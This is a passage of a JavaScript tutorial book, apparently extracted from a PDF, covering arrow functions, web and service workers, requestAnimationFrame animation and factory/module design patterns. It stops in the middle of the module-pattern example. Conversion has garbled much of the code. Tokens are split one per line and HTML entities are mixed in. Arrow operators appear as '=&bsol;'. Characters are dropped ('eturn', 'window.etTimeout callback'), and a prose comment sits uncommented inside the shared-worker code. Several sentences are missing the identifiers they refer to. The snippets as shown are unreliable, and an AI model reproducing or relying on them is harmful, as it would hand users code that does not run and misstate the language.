<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Arrow functions are a concise way of writing anonymous, lexically
scoped functions in [ECMAScript 2015
(ES6)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/New_in_JavaScript/ECMAScript_2015_support_in_Mozilla).
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch62-1">Section 62.1: Introduction</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
In JavaScript, functions may be anonymously defined using the
&quot;arrow&quot; (=&gt;) syntax, which is sometimes referred to as a *lambda
expression* due to Common Lisp similarities.
The simplest form of an arrow function has its arguments on the left
side of =&bsol;and the return value on the right side:
item
=&gt;
item
&plus;
1
// <i>-&bsol;function(item){return item + 1}</i>
This function can be immediately invoked by providing an argument to
the expression:
(
item
=&gt;
item
&plus;
1
)
(
41
)
// <i>-&bsol;42*
If an arrow function takes a single parameter, the parentheses around
that parameter are optional. For example, the following expressions
assign the same type of function into constant variables:
<b>const</b>
foo
=
bar
=&gt;
bar
&plus;
1
;
<b>const</b>
bar
=
(
baz
)
=&gt;
baz
&plus;
1
;
However, if the arrow function takes no parameters, or more than one
parameter, a new set of parentheses *must* encase all the arguments:
(
(
)
=&gt;
&quot;foo&quot;
)
(
)
// <i>-&amp;quot;foo&quot;</i>
(
(
bow
,
arrow
)
=&gt;
bow
&plus;
arrow
)
(
&apos;I took an arrow &apos;
,
&apos;to the knee&hellip;&apos;
)
// <i>-&amp;quot;I took an arrow to the knee&hellip;&quot;</i>
If the function body doesn&apos;t consist of a single expression, it must
be surrounded by brackets and use an explicit <b>return</b> statement for
providing a result:
(
bar
=&gt;
{
<b>const</b>
baz
=
41
;
<b>return</b>
bar
&plus;
baz
;
}
)
(
1
)
;
// <i>-&bsol;42*
If the arrow function&apos;s body consists only of an object literal, this
object literal has to be enclosed in parentheses:
(
bar
=&gt;
(
{
baz
:
1
}
)
)
(
)
;
// <i>-&bsol;Object {baz: 1}*
The extra parentheses indicate that the opening and closing brackets
are part of the object literal, i.e. they are not delimiters of the
function body.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch62-2">Section 62.2: Lexical Scoping & Binding (Value of &quot;this&quot;)</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Arrow functions are [lexically
scoped](http://stackoverflow.com/questions/1047454/what-is-lexical-scope);
this means that their <b>this</b> Binding is bound to the context of the
surrounding scope. That is to say, whatever <b>this</b> refers to can be
preserved by using an arrow function.
Take a look at the following example. The class Cow has a method that
allows for it to print out the sound it makes after 1 second.
class
Cow
{
constructor
(
)
{
<b>this</b>
.
sound
=
&quot;moo&quot;
;
}
makeSoundLater
(
)
{
setTimeout
(
(
)
=&gt;
console.
log
(
<b>this</b>
.
sound
)
,
1000
)
;
}
}
<b>const</b>
betsy
=
<b>new</b>
Cow
(
)
;
betsy.
makeSoundLater
(
)
;
makeSoundLater
betsy.makeSoundLater
In the () method, the <b>this</b> context refers to the current instance
of the Cow object, so in the case where I call (), the <b>this</b>
context refers to betsy.
<b>this</b>  . sound
By using the arrow function, I *preserve* the <b>this</b> context so that
I can make reference to when it comes time to print it out, which will
properly print out &quot;moo&quot;.
If you had used a regular function in place of the arrow function, you
would lose the context of being within the class, and not be able to
directly access the sound property.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch62-3">Section 62.3: Arguments Object</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Arrow functions do not expose an arguments object; therefore,
arguments would simply refer to a variable in the current scope.
<b>const</b>
arguments
=
&lbrack;
<b>true</b>
&rbrack;
;
<b>const</b>
foo
=
x
=&gt;
console.
log
(
arguments
&lbrack;
0
&rbrack;
)
;
foo
(
<b>false</b>
)
;
// <i>-&bsol;true*
Due to this, arrow functions are also <b>not</b> aware of their
caller/callee.

While the lack of an arguments object can be a limitation in some edge
cases, rest parameters are generally a suitable alternative.
<b>const</b>
arguments
=
&lbrack;
<b>true</b>
&rbrack;
;
<b>const</b>
foo
=
(
&hellip;
arguments
)
=&gt;
console.
log
(
arguments
&lbrack;
0
&rbrack;
)
;
foo
(
<b>false</b>
)
;
// <i>-&bsol;false*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch62-4">Section 62.4: Implicit Return</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Arrow functions may implicitly return values by simply omitting the
curly braces that traditionally wrap a function&apos;s body if their body
only contains a single expression.
**const**
foo
=
x
=&gt;
x
&plus;
1
;
foo
(
1
)
;
// <i>-&bsol;2*
When using implicit returns, object literals must be wrapped in
parenthesis so that the curly braces are not mistaken for the opening
of the function&apos;s body.
**const** foo = () =&bsol;{ bar: 1 } // <i>foo() returns undefined*
**const** foo = () =&lpar;{ bar: 1 }) // <i>foo() returns {bar: 1}*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch62-5">Section 62.5: Arrow functions as a constructor</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Arrow functions will throw a TypeError when used with the **new**
keyword.
**const**
foo
=
**function**
(
)
{
**return**
&apos;foo&apos;
;
}
**const**
a
=
**new**
foo
(
)
;
**const**
bar
=
(
)
=&gt;
{
**return**
&apos;bar&apos;
;
}
**const**
b
=
**new**
bar
(
)
;
// <i>-&bsol;Uncaught TypeError: bar is not a constructor&hellip;</i>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch62-6">Section 62.6: Explicit Return</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Arrow functions can behave very similar to classic functions in that
you may explicitly return a value from them using the **return**
keyword; simply wrap your function&apos;s body in curly braces, and return
a value:
**const**
foo
=
x
=&gt;
{
**return**
x
&plus;
1
;
}
foo
(
1
)
;
// <i>-&bsol;2*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch63">Chapter 63: Workers</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch63-1">Section 63.1: Web Worker</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
A web worker is a simple way to run scripts in background threads as
the worker thread can perform tasks (including I/O tasks using
XMLHttpRequest) without interfering with the user interface. Once
created, a worker can send messages which can be different data types
(except functions) to the JavaScript code that created it by posting
messages to an event handler specified by that code (and vice versa.)
Workers can be created in a few ways.
The most common is from a simple URL:
**var**
webworker
=
**new**
Worker
(
&quot;./path/to/webworker.js&quot;
)
;
URL.createObjectURL
It&apos;s also possible to create a Worker dynamically from a string using
():
**var**
workerData
=
&quot;function someFunction() {}; console.log(&apos;More code&apos;);&quot;
;
**var**
blobURL
=
URL.
createObjectURL
(
**new**
Blob
(
&lbrack;
&quot;(&quot;
&plus;
workerData
&plus;
&quot;)&quot;
&rbrack;
,
{
type
:
&quot;text/javascript&quot;
}
)
)
;
**var**
webworker
=
**new**
Worker
(
blobURL
)
;
Function   . toString
The same method can be combined with () to create a worker from an
existing function:
**var**
workerFn
=
**function**
(
)
{
console.
log
(
&quot;I was run&quot;
)
;
}
;
**var**
blobURL
=
URL.
createObjectURL
(
**new**
Blob
(
&lbrack;
&quot;(&quot;
&plus;
workerFn.
toString
(
)
&plus;
&quot;)&quot;
&rbrack;
,
{
type
:
&quot;text/javascript&quot;
}
)
)
;
**var**
webworker
=
**new**
Worker
(
blobURL
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch63-2">Section 63.2: A simple service worker</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**main.js**
A service worker is an event-driven worker registered against an
origin and a path. It takes the form of a JavaScript file that can
control the web page/site it is associated with, intercepting and
modifying navigation and resource requests, and caching resources in a
very granular fashion to give you complete control over how your app
behaves in certain situations (the most obvious one being when the
network is not available.)
Source:
[MDN](https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API)
**Few Things:**
1.  It&apos;s a JavaScript Worker, so it can&apos;t access the DOM directly
2.  It&apos;s a programmable network proxy
3.  It will be terminated when not in use and restarted when it&apos;s next
    needed
4.  A service worker has a lifecycle which is completely separate from
    your web page
5.  HTTPS is Needed
**&lt;script**
This code that will be executed in the Document context, (or) this
JavaScript will be included in your page via a **&gt;** tag.
// <i>we check if the browser supports ServiceWorkers*
**if**
(
&apos;serviceWorker&apos;
**in**
navigator
)
{
navigator
.
serviceWorker
.
register
(
// <i>path to the service worker file*
&apos;sw.js&apos;
)
// <i>the registration is async and it returns a promise*
.
then
(
**function**
(
reg
)
{
console.
log
(
&apos;Registration Successful&apos;
)
;
}
)
;
}
**sw.js**
This is the service worker code and is executed in the [ServiceWorker
Global
Scope](https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerGlobalScope).
self.
addEventListener
(
&apos;fetch&apos;
,
**function**
(
event
)
{
// <i>do nothing here, just log all the network requests*
console.
log
(
event.
request
.
url
)
;
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch63-3">Section 63.3: Register a service worker</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
// <i>Check if service worker is available.*
**if**
(
&apos;serviceWorker&apos;
**in**
navigator
)
{
navigator.
serviceWorker
.
register
(
&apos;/sw.js&apos;
)
.
then
(
**function**
(
registration
)
{
console.
log
(
&apos;SW registration succeeded with scope:&apos;
,
registration.
scope
)
;
}
)
.
**catch**
(
**function**
(
e
)
{
console.
log
(
&apos;SW registration failed with error:&apos;
,
e
)
;
}
)
;
}
You can call
register
(
)
on every page load. If the SW is already registered, the browser
provides you with
instance that is already running
The SW file can be any name.
sw.
js
is common.
The location of the SW file is important because it defines the SW&apos;s
scope. For example, an SW file at
  js   /   sw.js   can only intercept fetch requests for files that begin with js
/
//. For this reason you usually see the
SW file at the top-level directory of the project.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch63-4">Section 63.4: Communicating with a Web Worker</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Since workers run in a separate thread from the one that created them,
communication needs to happen via postMessage.

**Note:** Because of the different export prefixes, some browsers have
webkitPostMessage instead of postMessage. You should override
postMessage to make sure workers &quot;work&quot; (no pun intended) in the
most places possible: worker.postMessage = (worker.webkitPostMessage
&vert;&vert; worker.postMessage);

From the main thread (parent window):
// <i>Create a worker*
**var**
webworker
=
**new**
Worker
(
&quot;./path/to/webworker.js&quot;
)
;
// <i>Send information to worker*
webworker.
postMessage
(
&quot;Sample message&quot;
)
;
// <i>Listen for messages from the worker*
webworker.
addEventListener
(
&quot;message&quot;
,
**function**
(
event
)
{
// <i>&grave;event.data&grave; contains the value or object sent from the worker*
console.
log
(
&quot;Message from worker:&quot;
,
event.
data
)
;
// <i>&lbrack;&quot;foo&quot;, &quot;bar&quot;, &quot;baz&quot;&rbrack;</i>
}
)
;
webworker.js
From the worker, in :
// <i>Send information to the main thread (parent window)*
self.
postMessage
(
&lbrack;
&quot;foo&quot;
,
&quot;bar&quot;
,
&quot;baz&quot;
&rbrack;
)
;
// <i>Listen for messages from the main thread*
self.
addEventListener
(
&quot;message&quot;
,
**function**
(
event
)
{
// <i>&grave;event.data&grave; contains the value or object sent from main*
console.
log
(
&quot;Message from parent:&quot;
,
event.
data
)
;
// <i>&quot;Sample message&quot;</i>
}
)
;
Alternatively, you can also add event listeners using onmessage:

From the main thread (parent window):
webworker.
onmessage
=
**function**
(
event
)
{
console.
log
(
&quot;Message from worker:&quot;
,
event.
data
)
;
// <i>&lbrack;&quot;foo&quot;, &quot;bar&quot;, &quot;baz&quot;&rbrack;</i>
}
webworker.js
From the worker, in :
self.
onmessage
=
**function**
(
event
)
{
console.
log
(
&quot;Message from parent:&quot;
,
event.
data
)
;
// <i>&quot;Sample message&quot;</i>
}
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch63-5">Section 63.5: Terminate a worker</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Once you are done with a worker you should terminate it. This helps to
free up resources for other applications on the user's computer.
*Main Thread:*
// <i>Terminate a worker from your application.*
worker.
terminate
(
)
;
*Note*: The terminate method is not available for service workers. It
will be terminated when not in use, and restarted when it&apos;s next
needed.
*Worker Thread:*
// <i>Have a worker terminate itself.*
self.
close
(
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch63-6">Section 63.6: Populating your cache</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
After your service worker is registered, the browser will try to
install & later activate the service worker.
**Install event listener**
**this**
.
addEventListener
(
&apos;install&apos;
,
**function**
(
event
)
{
console.
log
(
&apos;installed&apos;

)
;
}
)
;
**Caching**
One can use this install event returned to cache the assets needed to
run the app offline. Below example uses the cache api to do the same.
**this**
.
addEventListener
(
&apos;install&apos;
,
**function**
(
event
)
{
event.
waitUntil
(
caches.
open
(
&apos;v1&apos;
)
.
then
(
**function**
(
cache
)
{
**return**
cache.
addAll
(
&lbrack;
<i>/&ast; Array of all the assets that needs to be cached &ast;/*
&apos;/css/style.css&apos;
,
&apos;/js/app.js&apos;
,
&apos;/images/snowTroopers.jpg&apos;
&rbrack;
)
;
}
)
)
;
}
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch63-7">Section 63.7: Dedicated Workers and Shared Workers</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Dedicated Workers**
A dedicated web worker is only accessible by the script that called
it.
Main application:
**var**
worker
=
**new**
Worker
(
&apos;worker.js&apos;
)
;
worker.
addEventListener
(
&apos;message&apos;
,
**function**
(
msg
)
{
console.
log
(
&apos;Result from the worker:&apos;
,
msg.
data
)
;
}
)
;
worker.
postMessage

(

&lbrack;

2

,

3

&rbrack;

)
;
worker.js:
self.
addEventListener
(
&apos;message&apos;
,
**function**
(
msg
)
{
console.
log
(
&apos;Worker received arguments:&apos;
,
msg.
data
)
;
self.
postMessage
(
msg.
data
&lbrack;
0
&rbrack;
&plus;
msg.
data
&lbrack;
1
&rbrack;
)
;
}
)
;
**Shared Workers**
A shared worker is accessible by multiple scripts  even if they are
being accessed by different windows, iframes or even workers.
Creating a shared worker is very similar to how to create a dedicated
one, but instead of the straight-forward communication between the
main thread and the worker thread, you&apos;ll have to communicate via a
port object, i.e., an explicit port has to be opened so multiple
scripts can use it to communicate with the shared worker. (Note that
dedicated workers do this implicitly) Main application
**var**
myWorker
=
**new**
SharedWorker
(
&apos;worker.js&apos;
)
;
myWorker.
port
.
start
(
)
;
// <i>open the port connection*
myWorker.
port
.
postMessage
(
&lbrack;
2
,
3
&rbrack;
)
;
worker.js
self.
port
.
start
(
)
;
open the port connection to enable two
&minus;
way communication
self.
onconnect
=
**function**
(
e
)
{
**var**
port
=
e&period;
ports
&lbrack;
0
&rbrack;
;
// <i>get the port*
port.
onmessage
=
**function**
(
e
)
{
console.
log
(
&apos;Worker received arguments:&apos;
,
e&period;
data
)
;
port.
postMessage
(
e&period;
data
&lbrack;
0
&rbrack;
&plus;
e&period;
data
&lbrack;
1
&rbrack;
)
;
}
}
port.start
Note that setting up this message handler in the worker thread also
implicitly opens the port connection back to the parent thread, so the
call to () is not actually needed, as noted above.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch64">Chapter 64: requestAnimationFrame</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Parameter Details**
&quot;A parameter specifying a function to call when it&apos;s time to update
your animation for the next callback
repaint.&quot;
(<https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame)>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch64-1">Section 64.1: Use requestAnimationFrame to fade in element</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**View jsFiddle**: <https://jsfiddle.net/HimmatChahal/jb5trg67/>
**Copy + Pasteable code below**:
**&lt;html&gt;**
**&lt;body&gt;**
**&lt;h1&gt;**This will fade in at 60 frames per second (or as close to
possible as your hardware allows)**&lt;/h1&gt;**
**&lt;script&gt;** // Fade in over 2000 ms = 2 seconds.
var FADE_DURATION = 2.0 &ast; 1000;
// -1 is simply a flag to indicate if we are rendering the very 1st
frame var startTime=-1.0;
// Function to render current frame (whatever frame that may be)
function render(currTime) { var head1 =
document.getElementsByTagName(&apos;h1&apos;)&lbrack;0&rbrack;;
// How opaque should head1 be? Its fade started at currTime=0.
// Over FADE_DURATION ms, opacity goes from 0 to 1 var opacity =
(currTime/FADE_DURATION); head1.style.opacity = opacity; }
// Function to function eachFrame() {
// Time that animation has been running (in ms)
// Uncomment the console.log function to view how quickly // the
timeRunning updates its value (may affect performance) var timeRunning
= (new Date()).getTime() - startTime; //console.log(&apos;var timeRunning
= &apos;+timeRunning+&apos;ms&apos;); if (startTime &lt; 0) {
// This branch: executes for the first frame only. // it sets the
startTime, then renders at currTime = 0.0 startTime = (new
Date()).getTime(); render(0.0);
} else if (timeRunning &lt; FADE_DURATION) {
// This branch: renders every frame, other than the 1st frame,
// with the new timeRunning value. render(timeRunning); } else {
eturn; }
// Now we are done rendering one frame.
// So we make a request to the browser to execute the next
// animation frame, and the browser optimizes the rest.
// This happens very rapidly, as you can see in the console.log();
window.requestAnimationFrame(eachFrame);
};
// start the animation
window.requestAnimationFrame
(
eachFrame
)
;
**&lt;**
**/script**
**&gt;**
**&lt;**
**/body**
**&gt;**
**&lt;**
**/html**
**&gt;**
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch64-2">Section 64.2: Keeping Compatibility</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Of course, just like most things in browser JavaScript, you just
can&apos;t count on the fact that everything will be the same everywhere.
In this case, requestAnimationFrame might have a prefix on some
platforms and are named differently, such as
webkitRequestAnimationFrame. Fortunately, there&apos;s a really easy way
to group all the known differences that could exist down to 1
function:
window.
requestAnimationFrame
=
(
**function**
(
)
{
**return**
window.
requestAnimationFrame
&vert;&vert;
window.
webkitRequestAnimationFrame
&vert;&vert;
window.
mozRequestAnimationFrame
&vert;&vert;
**function**
(
callback
)
{
window.
etTimeout
callback
,
1000
/
60
)
;
}
;
}
)
(
)
;
Note that the last option (which fills in when no existing support was
found) will not return an id to be used in cancelAnimationFrame. There
is, however an [efficient
polyfill](https://gist.github.com/paulirish/1579671) that was written
which fixes this.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch64-3">Section 64.3: Cancelling an Animation</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
To cancel a call to requestAnimationFrame, you need the id it returned
from when it was last called. This is the parameter you use for
cancelAnimationFrame. The following example starts some hypothetical
animation then pauses it after one second.
// <i>stores the id returned from each call to requestAnimationFrame*
**var**
requestId
;
// <i>draw something*
**function**
draw
(
timestamp
)
{
// <i>do some animation*
// <i>request next frame*
start
(
)
;
}
// <i>pauses the animation*
**function**
pause
(
)
{
// <i>pass in the id returned from the last call to requestAnimationFrame*
cancelAnimationFrame
(
requestId
)
;
}
// <i>begin the animation*
**function**
start
(
)
{
// <i>store the id returned from requestAnimationFrame*
requestId
=
requestAnimationFrame
(
draw
)
;
}
// <i>begin now*
start
(
)
;
// <i>after a second, pause the animation*
setTimeout
(
pause
,
1000
)
;
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h2 id="ch65"># Chapter 65: Creational Design Patterns</h2>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
Design patterns are a good way to keep your **code readable** and DRY.
DRY stands for **don&apos;t repeat yourself**. Below you could find more
examples about the most important design patterns.
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch65-1">Section 65.1: Factory Functions</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
A factory function is simply a function that returns an object.
>
Factory functions do not require the use of the **new** keyword, but
can still be used to initialize an object, like a constructor.
>
Often, factory functions are used as API wrappers, like in the cases
of [jQuery](https://jquery.com/) and
[moment.js](http://momentjs.com/), so users do not need to use
**new**.
>
The following is the simplest form of factory function; taking
arguments and using them to craft a new object with the object
literal:

**function**

cowFactory

(

name

)

{

**return**

{

name

:

name

,

talk

:

**function**

(

)

{

console.

log

(

&apos;Moo, my name is &apos;

&plus;

**this**

.

name

)

;

}

,

}

;

}

**var**

daisy

=

cowFactory

(

&apos;Daisy&apos;

)

;

// <i>create a cow named Daisy*

daisy.

talk

(

)

;

// <i>&quot;Moo, my name is Daisy&quot;</i>

It is easy to define private properties and methods in a factory, by
including them outside of the returned object.
>
This keeps your implementation details encapsulated, so you can only
expose the public interface to your object.

**function**

cowFactory

(

name

)

{

**function**

formalName

(

)

{

**return**

name

&plus;

&apos; the cow&apos;

;

}

**return**

{

talk

:

**function**

(

)

{

console.

log

(

&apos;Moo, my name is &apos;

&plus;

formalName

(

)

)

;

}

,

}

;

}

**var**

daisy

=

cowFactory

(

&apos;Daisy&apos;

)

;

daisy.

talk

(

)

;

// <i>&quot;Moo, my name is Daisy the cow&quot;</i>

daisy.

formalName

(

)

;

// <i>ERROR: daisy.formalName is not a function*

The last line will give an error because the function formalName is
closed inside the cowFactory function. This is a closure.
>
Factories are also a great way of applying functional programming
practices in JavaScript, because they are functions.

<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch65-2">Section 65.2: Factory with Composition</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
[*&apos;Prefer composition over
inheritance&apos;*](http://programmers.stackexchange.com/questions/134097/why-should-i-prefer-composition-over-inheritance)
is an important and popular programming principle, used to assign
behaviors to objects, as opposed to inheriting many often unneeded
behaviors.
>
**Behaviour factories**

**var**

speaker

=

**function**

(

state

)

{

**var**

noise

=

state.

noise

&vert;&vert;

&apos;grunt&apos;

;

**return**

{

speak

:

**function**

(

)

{

console.

log

(

state.

name

&plus;

&apos; says &apos;

&plus;

noise

)

;

}

}

;

}

;

**var**

mover

=

**function**

(

state

)

{

**return**

{

moveSlowly

:

**function**

(

)

{

console.

log

(

state.

name

&plus;

&apos; is moving slowly&apos;

)

;

}

,

moveQuickly

:

**function**

(

)

{

console.

log

(

state.

name

&plus;

&apos; is moving quickly&apos;

)

;

}

}

;

}

;

**Object factories**

Version ≥ 6

**var**

person

=

**function**

(

name

,

age

)

{

**var**

state

=

{

name

:

name

,

age

:

age

,

noise

:

&apos;Hello&apos;

}

;

**return**

Object

.

assign

(

// <i>Merge our &apos;behaviour&apos; objects*

{

}

,

speaker

(

state

)

,

mover

(

state

)

)

;

}

;

**var**

rabbit

=

**function**

(

name

,

colour

)

{

**var**

state

=

{

name

:

name

,

colour

:

colour

}

;

**return**

Object

.

assign

(

{

}

,

mover

(

state

)

)

;

}

;

**Usage**

**var**

fred

=

person

(

&apos;Fred&apos;

,

42
)
;
fred.speak(); // <i>outputs: Fred says Hello* fred.moveSlowly(); // <i>
outputs: Fred is moving slowly*

**var** snowy = rabbit(&apos;Snowy&apos;, &apos;white&apos;); snowy.moveSlowly(); // <i>
outputs: Snowy is moving slowly* snowy.moveQuickly(); // <i>outputs:
Snowy is moving quickly* snowy.speak(); // <i>ERROR: snowy.speak is not
a function*
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<h3 id="ch65-3">Section 65.3: Module and Revealing Module Patterns</h3>
<!--~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~-->
<!--
**Module Pattern**
The Module pattern is a [creational and structural design
pattern](https://en.wikipedia.org/wiki/Module_pattern#Module_as_a_design_pattern)
which provides a way of encapsulating private members while producing
a public API. This is accomplished by creating an IIFE which allows us
to define variables only available in its scope (through closure)
while returning an object which contains the public API.

This gives us a clean solution for hiding the main logic and only
exposing an interface we wish other parts of our application to use.
**var**
Module
=
(
